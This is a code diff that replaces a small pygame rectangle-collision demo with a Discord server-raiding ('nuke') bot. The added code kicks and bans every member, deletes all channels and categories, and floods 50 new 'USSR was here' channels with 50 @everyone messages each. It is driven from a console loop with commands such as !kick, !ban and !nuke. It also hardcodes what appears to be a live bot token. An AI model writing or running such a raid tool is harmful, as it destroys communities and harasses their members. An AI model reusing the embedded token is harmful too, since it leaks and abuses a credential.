@@ -1,63 +1,100 @@
-import sys
+import asyncio
+import threading
 
-import pygame
+import discord
+from discord.ext import commands
 
-# Initialize Pygame
-pygame.init()
+prefix = "!"
+TOKEN = 'MTAyMjkyMjE5Mzc2MTQ4NDg5MQ.GdHJMR.FsDpQwh8tYWmUKq1-ympqBawnV0TYtzG61ZJm8'
 
-# Screen dimensions
-WIDTH, HEIGHT = 800, 600
-screen = pygame.display.set_mode((WIDTH, HEIGHT))
-clock = pygame.time.Clock()
+intents = discord.Intents.default()  # create instance of Intents class
+bot = commands.Bot(command_prefix=prefix, intents=intents)  # pass intents to Bot constructor
 
-# Colors
-WHITE = (255, 255, 255)
-RED = (255, 0, 0)
-BLUE = (0, 0, 255)
+# rest of your code
 
-# Player image
-player_image = pygame.Surface((50, 50))
-player_image.fill(RED)  # Fill with red color for demonstration
+with open("battlestandard.png", 'rb') as f:
+    image = discord.File(f)
+message = f"@everyone USSR is here. Stand down."
 
-# Player rect (big)
-player_rect_big = player_image.get_rect()
-player_rect_big.center = (WIDTH // 2, HEIGHT // 2)
-big_rect_alignment_point = (player_rect_big.centerx, player_rect_big.centery + 20)  # Example: 20px below center
+def run_bot():
+    bot.run(TOKEN)
 
-# Player rect (small, for collision detection)
-small_rect_size = (25, 25)  # Small rect size
-player_rect_small = pygame.Rect(big_rect_alignment_point, small_rect_size)
+async def kick_all_members(guild):
+    for member in guild.members:
+        await member.kick()
+        print(f'{member} kicked.')
+    print('All members have been kicked.')
 
-# Offset between the alignment points of big and small rects
-offset_x = player_rect_small.centerx - big_rect_alignment_point[0]
-offset_y = player_rect_small.centery - big_rect_alignment_point[1]
+async def ban_all_members(guild):
+    for member in guild.members:
+        await member.ban()
+        print(f'{member} banned.')
+    print('All members have been banned.')
 
-# Main game loop
-running = True
-while running:
-    screen.fill(WHITE)
+async def create_text_channels_with_messages(guild):
+    await delete_all_channels_and_categories(guild)
+    tasks = []
+    for i in range(50):
+        tasks.append(create_channel_and_send_messages(guild, i))
+    await asyncio.gather(*tasks)
 
-    # Event handling
-    for event in pygame.event.get():
-        if event.type == pygame.QUIT:
-            running = False
+async def create_channel_and_send_messages(guild, i):
+    existing_channel = discord.utils.get(guild.channels, name=f"USSR was here {i}")
+    if not existing_channel:
+        new_channel = await guild.create_text_channel(f"USSR was here {i}")
+        message_tasks = [new_channel.send(message) for _ in range(50)]
+        await asyncio.gather(*message_tasks)
+        print(f'New text channel "USSR was here {i}" created and message sent.')
+    else:
+        print('Channel with that name already exists.')
 
-    # Update
-    player_rect_big.center = pygame.mouse.get_pos()  # Move big rect with mouse
-    # Update small rect position based on the offset
-    player_rect_small.centerx = player_rect_big.centerx + offset_x
-    player_rect_small.centery = player_rect_big.centery + offset_y
 
-    # Draw
-    # Draw big rect
-    pygame.draw.rect(screen, (0, 255, 0), player_rect_big, 2)
-    # Draw small rect
-    pygame.draw.rect(screen, BLUE, player_rect_small, 2)
-    # Draw player image
-    screen.blit(player_image, player_rect_big.topleft)
+async def send_message_to_channel(guild, channel_id, message, include_everyone=False, image_path=None):
+    channel = bot.get_channel(int(channel_id))
+    if channel:
+        if image_path:
+            with open(image_path, 'rb') as f:
+                image = discord.File(f)
+            await channel.send(content=message, file=image)
+        else:
+            if include_everyone:
+                await channel.send(f"@everyone {message}")
+            else:
+                await channel.send(message)
+        print(f'Message sent to channel {channel_id}.')
+    else:
+        print('Invalid channel ID.')
 
-    pygame.display.flip()
-    clock.tick(60)
+async def delete_all_channels_and_categories(guild):
+    tasks = [delete_channel(channel) for channel in guild.channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel))]
+    await asyncio.gather(*tasks)
+    print('All channels and categories have been deleted.')
 
-pygame.quit()
-sys.exit()
+async def delete_channel(channel):
+    await channel.delete()
+    print(f'{channel} deleted.')
+
+# Command-line interface
+if __name__ == "__main__":
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.start()
+    print("Bot is running. You can now use command line inputs.")
+
+    while True:
+        try:
+            command = input("Enter command: ")
+            if command.lower() == "quit":
+                break
+            elif command.lower() == "!kick":
+                asyncio.run_coroutine_threadsafe(kick_all_members(bot.guilds[0]), bot.loop)
+            elif command.lower() == "!ban":
+                asyncio.run_coroutine_threadsafe(ban_all_members(bot.guilds[0]), bot.loop)
+            elif command.startswith("!nuke"):
+                asyncio.run_coroutine_threadsafe(create_text_channels_with_messages(bot.guilds[0]), bot.loop)
+            elif command.startswith("!send_message"):
+                _, channel_id, message = command.split(" ", 2)
+                asyncio.run_coroutine_threadsafe(send_message_to_channel(bot.guilds[0], channel_id, message), bot.loop)
+            else:
+                print("Invalid command. Please try again.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
